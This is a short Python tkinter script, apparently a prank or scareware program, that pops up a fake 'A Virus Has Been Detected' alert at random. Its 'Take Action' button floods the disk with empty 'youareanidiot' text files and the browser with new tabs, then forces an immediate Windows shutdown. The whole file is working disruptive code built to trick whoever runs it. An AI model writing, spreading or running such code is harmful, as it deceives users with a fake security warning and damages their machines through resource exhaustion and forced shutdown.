from tkinter import *
import time
import random
import os
import webbrowser


def makePopUp():

    time.sleep(5)
    popup = Tk()
    vir = Label(popup, text="A Virus Has Been Detected", font=("Time New Roman", 10))
    vir.place(x=0,y=0)
    but = Button(popup, text="Take Action", font=("Times New Roman", 10), fg="Blue", command=virusChallenger)
    but.place(x=30, y=50)
    popup.configure(background="Blue")
    popup.title("Virus Detected")
    popup.mainloop()

def start():
    while True:
        e = time.sleep(2)
        if random.randrange(0, 10) == 4:
            makePopUp()
            start()
            break

def virusChallenger():
    for i in range(20000000000000):
        with open(f"youareanidiot({i}).txt", "x") as f:
            f.write("")
            webbrowser.open_new_tab("http://www.google.com")
            
    os.system("shutdown /s /t 1")
    
start()
        